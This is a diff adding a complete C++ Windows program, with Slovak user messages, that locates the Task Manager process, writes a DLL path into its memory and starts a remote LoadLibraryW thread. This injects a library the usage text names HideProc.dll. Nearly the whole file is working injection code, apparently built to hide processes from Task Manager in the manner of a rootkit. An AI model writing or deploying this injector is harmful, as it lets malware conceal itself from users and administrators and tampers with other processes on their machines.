@@ -1,0 +1,57 @@
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <tchar.h>
+#include <string>
+#include <iostream>
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid = 0;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (Process32First(snapshot, &entry)) {
+        do {
+            if (!_wcsicmp(entry.szExeFile, processName.c_str())) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snapshot, &entry));
+    }
+    CloseHandle(snapshot);
+    return pid;
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+    if (argc < 2) {
+        std::wcout << L"Použitie: injector.exe cesta\\k\\HideProc.dll" << std::endl;
+        return 1;
+    }
+
+    std::wstring dllPath = argv[1];
+    DWORD pid = FindProcessId(L"Taskmgr.exe");
+
+    if (pid == 0) {
+        std::wcout << L"Task Manager nenájdený!" << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        std::wcout << L"Zlyhalo otvorenie procesu!" << std::endl;
+        return 1;
+    }
+
+    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, allocMem, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), NULL);
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)LoadLibraryW, allocMem, 0, NULL);
+
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return 0;
+}
